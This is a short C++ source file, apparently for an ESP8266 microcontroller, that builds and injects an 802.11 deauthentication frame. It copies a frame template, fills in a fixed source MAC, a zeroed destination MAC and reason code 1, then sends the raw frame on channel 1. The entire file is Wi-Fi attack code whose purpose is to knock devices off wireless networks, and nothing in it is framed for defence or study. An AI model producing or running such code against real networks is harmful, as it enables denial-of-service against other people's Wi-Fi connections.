#include "Deauth.h"

uint8_t srcMAC[6] = { 0x42, 0xF5, 0x20, 0x0B, 0x4F, 0x8E }; // 42:f5:20:0b:4f:8e
uint8_t dstMAC[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; 

uint8_t reason = 1;

Deauth::Deauth() {
  
}

void Deauth::sendDeauth() {
   packetSize = sizeof(deauthPacket);

    uint8_t pkt[packetSize];

    memcpy(pkt, deauthPacket, packetSize);

    memcpy(&pkt[4],  dstMAC, 6);
    memcpy(&pkt[10], srcMAC, 6);
    memcpy(&pkt[16], srcMAC, 6);
    pkt[24] = reason;

    
    wifi_set_channel(1);
    bool sent = wifi_send_pkt_freedom(pkt, packetSize, 0) == 0;
}
